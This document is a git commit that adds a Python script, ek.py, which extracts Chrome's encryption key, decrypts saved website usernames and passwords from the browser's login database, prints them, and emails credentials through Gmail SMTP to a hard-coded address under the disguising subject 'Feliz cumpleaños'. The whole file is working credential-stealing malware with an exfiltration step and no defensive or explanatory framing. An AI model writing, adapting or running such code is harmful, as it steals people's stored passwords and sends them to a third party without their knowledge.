f37c02d8b3c260cea7a7e68e7a2b3b6abd860dd5
edgearrieta <67113349+edgearrieta@users.noreply.github.com>
2021-04-13 12:41:24 -0500

    Create ek.py

---
+++ ek.py
@@ -0,0 +1,115 @@
+import os
+import json
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+from datetime import timezone, datetime, timedelta
+import time
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+
+
+def get_chrome_datetime(chromedate):
+    
+    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+
+def get_encryption_key():
+
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    
+    with open(local_state_path, "r", encoding="utf8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+    
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+def decrypt_password(password, key):
+    try:
+        # get the initialization vector
+        iv = password[3:15]
+        password = password[15:]
+        # generate cipher
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        # decrypt password
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            # not supported
+            return ""
+
+def main():
+    # get the AES key
+    key = get_encryption_key()
+    # local sqlite Chrome database path
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "Google", "Chrome", "User Data", "Default", "Login Data")
+    # copy the file to another location
+    # as the database will be locked if chrome is currently running
+    filename = "ChromeData.db"
+    shutil.copyfile(db_path, filename)
+    # connect to the database
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+    # `logins` table has the data we need
+    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+    # iterate over all rows
+    for row in cursor.fetchall():
+        origin_url = row[0]
+        action_url = row[1]
+        username = row[2]
+        password = decrypt_password(row[3], key)
+        date_created = row[4]
+        date_last_used = row[5]        
+        if username or password:
+            print(f"Origin URL: {origin_url}")
+            print(f"Action URL: {action_url}")
+            print(f"Username: {username}")
+            print(f"Password: {password}")
+        else:
+            continue
+        if date_created != 86400000000 and date_created:
+            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
+        if date_last_used != 86400000000 and date_last_used:
+            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
+        print("="*50)
+    cursor.close()
+    db.close()
+    try:
+        # try to remove the copied db file
+        os.remove(filename)
+    except:
+        pass
+    
+    msg = MIMEMultipart()
+    from_addr = '++++++++++'
+    passw = "+++++++++++"
+    to_addr = 'kloppip13@gmail.com'
+    
+    msg['From'] = from_addr
+    #msg['To'] = to_addr
+    msg['Subject'] = "Feliz cumpleaños"
+
+    smtp_Server = smtplib.SMTP('smtp.gmail.com', 587)
+    smtp_Server.ehlo()
+    smtp_Server.starttls()
+    smtp_Server.login(from_addr, passw)
+
+    text = msg.as_string()
+    smtp_Server.sendmail(from_addr, to_addr,(username + '\n' + password))
+    smtp_Server.quit()
+    time.sleep(10)
+    print(f"felicidades mail enviado")
+
+
+if __name__ == "__main__":
+    main()
